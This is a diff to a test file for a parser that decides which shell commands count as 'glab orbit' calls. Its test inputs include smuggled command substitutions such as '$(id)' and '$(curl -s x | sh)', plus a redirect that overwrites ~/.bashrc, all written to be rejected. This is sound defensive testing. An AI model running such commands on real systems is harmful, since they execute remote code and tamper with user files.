@@ -71,6 +71,15 @@ test('harmless redirects, a pipe into head or tail, and a bare true keep an Orbi
   }
 })
 
+test('an echo between orbit calls keeps them Orbit calls', () => {
+  expect(orbitInvocations("glab orbit grep 'a' 2>&1 | head -c 3000; echo ---; glab orbit grep 'b'")).toEqual([
+    ['grep', 'a'],
+    ['grep', 'b'],
+  ])
+  expect(orbitInvocations('glab orbit grep a; echo $(id)')).toEqual([])
+  expect(orbitInvocations('glab orbit grep a; echo x > ~/.bashrc')).toEqual([])
+})
+
 test('substitutions, standalone head or tail, true with arguments, and other env prefixes are not Orbit calls', () => {
   for (const command of [
     'glab orbit query "MATCH (n) RETURN n $(curl -s x | sh)"',
